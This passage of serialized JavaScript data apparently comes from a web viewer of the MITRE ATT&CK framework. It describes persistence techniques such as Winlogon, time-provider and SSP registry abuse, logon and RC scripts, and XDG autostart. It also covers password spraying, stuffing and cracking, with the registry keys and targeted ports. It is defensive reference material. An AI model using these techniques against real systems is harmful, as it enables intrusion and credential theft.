Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: \u003Ccode\u003EHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\u003C\u002Fcode\u003E and \u003Ccode\u003EHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages\u003C\u002Fcode\u003E. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fdocplayer.net\u002F20839173-Analysis-of-malicious-security-support-provider-dlls.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";kQ.external_references=[{source_name:b,external_id:kR,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F005"},{url:eb,description:ec,source_name:ed},{url:kw,description:kx,source_name:ky}];kQ["subtechnique-of"]=v;kS.id=kT;kS["object-type"]=a;kS.name="Shortcut Modification";kS.description="Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.";kS.external_references=[{source_name:b,external_id:kT,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F009"},{external_id:"CAPEC-132",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F132.html"},{source_name:"BSidesSLC 2020 - LNK Elastic",url:"https:\u002F\u002Fwww.youtube.com\u002Fwatch?v=nJ0UsyiUEqQ",description:"French, D., Filar, B.. (2020, March 21). A Chain Is No Stronger Than Its Weakest LNK. Retrieved November 30, 2020."}];kS["subtechnique-of"]=v;kU.id=kV;kU["object-type"]=a;kU.name="Time Providers";kU.description="Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-server\u002Fnetworking\u002Fwindows-time-service\u002Fwindows-time-service-top'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E W32Time time providers are responsible for retrieving time stamps from hardware\u002Fnetwork resources and outputting these values to other network clients. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms725475.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  \u003Ccode\u003EHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\\u003C\u002Fcode\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms725475.aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and\u002For whenever parameters are changed. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms725475.aspx'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fscottlundgren\u002Fw32time'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";kU.external_references=[{source_name:b,external_id:kV,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F003"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-server\u002Fnetworking\u002Fwindows-time-service\u002Fwindows-time-service-top",description:"Microsoft. (2018, February 1). Windows Time Service (W32Time). Retrieved March 26, 2018.",source_name:"Microsoft W32Time Feb 2018"},{url:kj,description:kk,source_name:kl},{url:"https:\u002F\u002Fgithub.com\u002Fscottlundgren\u002Fw32time",description:"Lundgren, S. (2017, October 28). w32time. Retrieved March 26, 2018.",source_name:"Github W32Time Oct 2017"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-server\u002Fnetworking\u002Fwindows-time-service\u002Fwindows-time-service-tools-and-settings",description:"Mathers, B. (2017, May 31). Windows Time Service Tools and Settings. Retrieved March 26, 2018.",source_name:"Microsoft W32Time May 2017"},{url:y,description:z,source_name:A}];kU["subtechnique-of"]=v;kW.id=kX;kW["object-type"]=a;kW.name="Winlogon Helper DLL";kW.description="Adversaries may abuse features of Winlogon to execute DLLs and\u002For executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon\u002Flogoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in \u003Ccode\u003EHKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\u003C\u002Fcode\u003E and \u003Ccode\u003EHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\u003C\u002Fcode\u003E are used to manage additional helper programs and functionalities that support Winlogon. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.cylance.com\u002Fwindows-registry-persistence-part-2-the-run-keys-and-search-order'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and\u002For executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.cylance.com\u002Fwindows-registry-persistence-part-2-the-run-keys-and-search-order'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.";kW.external_references=[{source_name:b,external_id:kX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F004"},{external_id:"CAPEC-579",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F579.html"},{url:km,description:kn,source_name:ko},{url:y,description:z,source_name:A}];kW["subtechnique-of"]=v;kY.id=kZ;kY["object-type"]=a;kY.name="XDG Autostart Entries";kY.description="Adversaries may modify XDG autostart entries to execute programs or commands during system boot. Linux desktop environments that are XDG compliant implement functionality for XDG autostart entries. These entries will allow an application to automatically start during the startup of a desktop environment after user logon. By default, XDG autostart entries are stored within the \u003Ccode\u003E\u002Fetc\u002Fxdg\u002Fautostart\u003C\u002Fcode\u003E or \u003Ccode\u003E~\u002F.config\u002Fautostart\u003C\u002Fcode\u003E directories and have a .desktop file extension.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fspecifications.freedesktop.org\u002Fautostart-spec\u002Fautostart-spec-latest.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nWithin an XDG autostart entry file, the \u003Ccode\u003EType\u003C\u002Fcode\u003E key specifies if the entry is an application (type 1), link (type 2) or directory (type 3). The \u003Ccode\u003EName\u003C\u002Fcode\u003E key indicates an arbitrary name assigned by the creator and the \u003Ccode\u003EExec\u003C\u002Fcode\u003E key indicates the application and command line arguments to execute.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fspecifications.freedesktop.org\u002Fdesktop-entry-spec\u002F1.2\u002Far01s06.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use XDG autostart entries to maintain persistence by executing malicious commands and payloads, such as remote access tools, during the startup of a desktop environment. Commands included in XDG autostart entries with execute after user logon in the context of the currently logged on user. Adversaries may also use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E to make XDG autostart entries look as if they are associated with legitimate programs.";kY.external_references=[{source_name:b,external_id:kZ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F013"},{description:"Free Desktop. (2006, February 13). Desktop Application Autostart Specification. Retrieved September 12, 2019.",url:"https:\u002F\u002Fspecifications.freedesktop.org\u002Fautostart-spec\u002Fautostart-spec-latest.html",source_name:"Free Desktop Application Autostart Feb 2006"},{description:"Free Desktop. (2017, December 24). Recognized Desktop Entry Keys. Retrieved September 12, 2019.",url:"https:\u002F\u002Fspecifications.freedesktop.org\u002Fdesktop-entry-spec\u002F1.2\u002Far01s06.html",source_name:"Free Desktop Entry Keys"}];kY["subtechnique-of"]=v;k_.id=k$;k_["object-type"]=a;k_.name="Logon Script (Mac)";k_.description="Adversaries may use macOS logon scripts automatically executed at logon initialization to establish persistence. macOS allows logon scripts (known as login hooks) to be executed whenever a specific user logs into a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1037\u002F005'\u003EStartup Items\u003C\u002Fa\u003E, a login hook executes as the elevated root user.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.apple.com\u002Fde-at\u002FHT2420'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use these login hooks to maintain persistence on a single system.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sentinelone.com\u002Fblog\u002Fhow-malware-persists-on-macos\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Access to login hook scripts may allow an adversary to insert additional malicious code. There can only be one login hook at a time though and depending on the access configuration of the hooks, either local credentials or an administrator account may be necessary. ";k_.external_references=[{source_name:b,external_id:k$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1037\u002F002"},{url:"https:\u002F\u002Fsupport.apple.com\u002Fde-at\u002FHT2420",description:"Apple. (2011, June 1). Mac OS X: Creating a login hook. Retrieved July 17, 2017.",source_name:"creating login hook"},{source_name:"S1 macOs Persistence",url:la,description:"Stokes, P. (2019, July 17). How Malware Persists on macOS. Retrieved March 27, 2020."}];k_["subtechnique-of"]=al;lb.id=lc;lb["object-type"]=a;lb.name="Logon Script (Windows)";lb.description="Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc758918(v=ws.10).aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This is done via adding a path to a script to the \u003Ccode\u003EHKCU\\Environment\\UserInitMprLogonScript\u003C\u002Fcode\u003E Registry key.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.hexacorn.com\u002Fblog\u002F2014\u002F11\u002F14\u002Fbeyond-good-ol-run-key-part-18\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. ";lb.external_references=[{source_name:b,external_id:lc,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1037\u002F001"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc758918(v=ws.10).aspx",description:"Microsoft. (2005, January 21). Creating logon scripts. Retrieved April 27, 2016.",source_name:"TechNet Logon Scripts"},{source_name:"Hexacorn Logon Scripts",url:"http:\u002F\u002Fwww.hexacorn.com\u002Fblog\u002F2014\u002F11\u002F14\u002Fbeyond-good-ol-run-key-part-18\u002F",description:"Hexacorn. (2014, November 14). Beyond good ol’ Run key, Part 18. Retrieved November 15, 2019."}];lb["subtechnique-of"]=al;ld.id=le;ld["object-type"]=a;ld.name="Network Logon Script";ld.description="Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.petri.com\u002Fsetting-up-logon-script-through-active-directory-users-computers-windows-server-2008'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.";ld.external_references=[{source_name:b,external_id:le,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1037\u002F003"},{source_name:"Petri Logon Script AD",url:"https:\u002F\u002Fwww.petri.com\u002Fsetting-up-logon-script-through-active-directory-users-computers-windows-server-2008",description:"Daniel Petri. (2009, January 8). Setting up a Logon Script through Active Directory Users and Computers in Windows Server 2008. Retrieved November 15, 2019."}];ld["subtechnique-of"]=al;lf.id=lg;lf["object-type"]=a;lf.name="RC Scripts";lf.description="Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries can establish persistence by adding a malicious binary path or shell commands to \u003Ccode\u003Erc.local\u003C\u002Fcode\u003E, \u003Ccode\u003Erc.common\u003C\u002Fcode\u003E, and other RC scripts specific to the Unix-like distribution.\u003Csup\u003E\u003Ca href='https:\u002F\u002Firanthreats.github.io\u002Fresources\u002Fattribution-flying-rocket-kitten\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.intezer.com\u002Fblog-hiddenwasp-malware-targeting-linux-systems\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.intezer.com\u002Fblog\u002Fresearch\u002Fkaiji-new-chinese-linux-malware-turning-to-golang\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F004'\u003ELaunchd\u003C\u002Fa\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLaunchdJobs.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FStartupItems.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fmanpages.ubuntu.com\u002Fmanpages\u002Fbionic\u002Fman8\u002Fsystemd-rc-local-generator.8.html'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";lf.external_references=[{source_name:b,external_id:lg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1037\u002F004"},{source_name:"IranThreats Kittens Dec 2017",url:"https:\u002F\u002Firanthreats.github.io\u002Fresources\u002Fattribution-flying-rocket-kitten\u002F",description:"Iran Threats . (2017, December 5). Flying Kitten to Rocket Kitten, A Case of Ambiguity and Shared Code. Retrieved May 28, 2020."},{description:"Sanmillan, I. (2019, May 29). HiddenWasp Malware Stings Targeted Linux Systems. Retrieved June 24, 2019.",url:"https:\u002F\u002Fwww.intezer.com\u002Fblog-hiddenwasp-malware-targeting-linux-systems\u002F",source_name:"Intezer HiddenWasp Map 2019"},{source_name:lh,url:li,description:lj},{source_name:"Apple Developer Doco Archive Launchd",url:"https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLaunchdJobs.html",description:"Apple. (2016, September 13). Daemons and Services Programming Guide - Creating Launch Daemons and Agents. Retrieved February 24, 2021."},{url:lk,description:ll,source_name:eg},{url:B,description:S,source_name:T},{source_name:"Ubuntu Manpage systemd rc",url:"http:\u002F\u002Fmanpages.ubuntu.com\u002Fmanpages\u002Fbionic\u002Fman8\u002Fsystemd-rc-local-generator.8.html",description:"Canonical Ltd.. (n.d.). systemd-rc-local-generator - Compatibility generator for starting \u002Fetc\u002Frc.local and        \u002Fusr\u002Fsbin\u002Fhalt.local during boot and shutdown. Retrieved February 23, 2021."}];lf["subtechnique-of"]=al;lm.id=ln;lm["object-type"]=a;lm.name=eg;lm.description="Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FStartupItems.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThis is technically a deprecated technology (superseded by \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F004'\u003ELaunch Daemon\u003C\u002Fa\u003E), and thus the appropriate folder, \u003Ccode\u003E\u002FLibrary\u002FStartupItems\u003C\u002Fcode\u003E isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), \u003Ccode\u003EStartupParameters.plist\u003C\u002Fcode\u003E, reside in the top-level directory. \n\nAn adversary can create the appropriate folders\u002Ffiles in the StartupItems directory to register their own persistence mechanism \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.";lm.external_references=[{source_name:b,external_id:ln,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1037\u002F005"},{url:lk,description:ll,source_name:eg},{url:B,description:S,source_name:T}];lm["subtechnique-of"]=al;lv.id=lw;lv["object-type"]=a;lv.name="Credential Stuffing";lv.description="Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22\u002FTCP)\n* Telnet (23\u002FTCP)\n* FTP (21\u002FTCP)\n* NetBIOS \u002F SMB \u002F Samba (139\u002FTCP & 445\u002FTCP)\n* LDAP (389\u002FTCP)\n* Kerberos (88\u002FTCP)\n* RDP \u002F Terminal Services (3389\u002FTCP)\n* HTTP\u002FHTTP Management Services (80\u002FTCP & 443\u002FTCP)\n* MSSQL (1433\u002FTCP)\n* Oracle (1521\u002FTCP)\n* MySQL (3306\u002FTCP)\n* VNC (5900\u002FTCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA18-086A'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";lv.external_references=[{source_name:b,external_id:lw,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110\u002F004"},{external_id:"CAPEC-600",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F600.html"},{source_name:bo,url:bp,description:bq}];lv["subtechnique-of"]=aN;lx.id=ly;lx["object-type"]=a;lx.name="Password Cracking";lx.description="Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E is used to obtain password hashes, this may only get an adversary so far when \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F002'\u003EPass the Hash\u003C\u002Fa\u003E is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FPassword_cracking'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.";lx.external_references=[{source_name:b,external_id:ly,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110\u002F002"},{external_id:"CAPEC-55",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F55.html"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FPassword_cracking",description:"Wikipedia. (n.d.). Password cracking. Retrieved December 23, 2015.",source_name:"Wikipedia Password cracking"}];lx["subtechnique-of"]=aN;lz.id=lA;lz["object-type"]=a;lz.name="Password Guessing";lz.description="Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20200302085133\u002Fhttps:\u002F\u002Fwww.cylance.com\u002Fcontent\u002Fdam\u002Fcylance\u002Fpages\u002Foperation-cleaver\u002FCylance_Operation_Cleaver_Report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22\u002FTCP)\n* Telnet (23\u002FTCP)\n* FTP (21\u002FTCP)\n* NetBIOS \u002F SMB \u002F Samba (139\u002FTCP & 445\u002FTCP)\n* LDAP (389\u002FTCP)\n* Kerberos (88\u002FTCP)\n* RDP \u002F Terminal Services (3389\u002FTCP)\n* HTTP\u002FHTTP Management Services (80\u002FTCP & 443\u002FTCP)\n* MSSQL (1433\u002FTCP)\n* Oracle (1521\u002FTCP)\n* MySQL (3306\u002FTCP)\n* VNC (5900\u002FTCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA18-086A'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.";lz.external_references=[{source_name:b,external_id:lA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110\u002F001"},{external_id:lt,source_name:c,url:lu},{source_name:lB,description:lC,url:lD},{source_name:bo,url:bp,description:bq}];lz["subtechnique-of"]=aN;lE.id=lF;lE["object-type"]=a;lE.name="Password Spraying";lE.description="Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.blackhillsinfosec.com\u002F?p=4645'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22\u002FTCP)\n* Telnet (23\u002FTCP)\n* FTP (21\u002FTCP)\n* NetBIOS \u002F SMB \u002F Samba (139\u002FTCP & 445\u002FTCP)\n* LDAP (389\u002FTCP)\n* Kerberos (88\u002FTCP)\n* RDP \u002F Terminal Services (3389\u002FTCP)\n* HTTP\u002FHTTP Management Services (80\u002FTCP & 443\u002FTCP)\n* MSSQL (1433\u002FTCP)\n* Oracle (1521\u002FTCP)\n* MySQL (3306\u002FTCP)\n* VNC (5900\u002FTCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA18-086A'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.";lE.external_references=[{source_name:b,external_id:lF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110\u002F003"},{external_id:"CAPEC-565",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F565.html"},{url:"http:\u002F\u002Fwww.blackhillsinfosec.com\u002F?p=4645",description:"Thyer, J. (2015, October 30). Password Spraying & Other Fun with RPCCLIENT. Retrieved April 25, 2017.",source_name:"BlackHillsInfosec Password Spraying"},{source_name:bo,url:bp,description:bq},{source_name:"Trimarc Detecting Password Spraying",url:"https:\u002F\u002Fwww.trimarcsecurity.com\u002Fsingle-post\u002F2018\u002F05\u002F06\u002FTrimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing",description:"Metcalf, S. (2018, May 6). Trimarc Research: Detecting Password Spraying with Security Event Auditing. Retrieved January 16, 2019."}];lE["subtechnique-of"]=aN;lR.id=lS;lR["object-type"]=a;lR.name="AppleScript";lR.description="Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Farchive\u002Fdocumentation\u002FAppleScript\u002FConceptual\u002FAppleScriptLangGuide\u002Fintroduction\u002FASLR_intro.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via \u003Ccode\u003Eosascript \u002Fpath\u002Fto\u002Fscript\u003C\u002Fcode\u003E or \u003Ccode\u003Eosascript -e \"script here\"\u003C\u002Fcode\u003E. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding \u003Ccode\u003E#!\u002Fusr\u002Fbin\u002Fosascript\u003C\u002Fcode\u003E to the start of the script file.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sentinelone.com\u002Fblog\u002Fhow-offensive-actors-use-applescript-for-attacking-macos\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAppleScripts do not need to call \u003Ccode\u003Eosascript\u003C\u002Fcode\u003E to execute, however. They may be executed from within mach-O binaries by using the macOS \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1106'\u003ENative API\u003C\u002Fa\u003Es \u003Ccode\u003ENSAppleScript\u003C\u002Fcode\u003E or \u003Ccode\u003EOSAScript\u003C\u002Fcode\u003E, both of which execute code independent of the \u003Ccode\u003E\u002Fusr\u002Fbin\u002Fosascript\u003C\u002Fcode\u003E command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1106'\u003ENative API\u003C\u002Fa\u003Es, which otherwise would require compilation and execution in a mach-O binary file format.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sentinelone.com\u002Fblog\u002Fmacos-red-team-calling-apple-apis-without-building-binaries\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via \u003Ca 